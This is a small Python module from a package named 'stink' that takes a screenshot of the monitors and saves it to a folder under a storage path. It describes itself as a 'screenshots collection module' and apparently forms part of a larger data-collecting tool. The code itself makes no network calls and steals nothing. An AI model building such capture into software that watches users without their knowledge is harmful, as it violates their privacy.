from os import mkdir, path

from stink.utils.screenshot import Screencapture


class Screenshot:
    """
    Takes a screenshot of the monitors.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__storage_path = storage_path
        self.__folder = folder

    def __create_folder(self) -> None:
        """
        Creates storage for the Screenshot module.
        :return: None
        """
        storage_path = rf"{self.__storage_path}\{self.__folder}"

        if not path.exists(storage_path):
            mkdir(storage_path)

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.
        :return: None
        """
        screenshot = Screencapture()
        screenshot.create(monitor=0, path=rf"{self.__storage_path}\{self.__folder}")

    def run(self) -> None:
        """
        Launches the screenshots collection module.
        :return: None
        """
        try:

            self.__create_folder()
            self.__create_screen()

        except Exception as e:
            print(f"[Screenshot]: {repr(e)}")
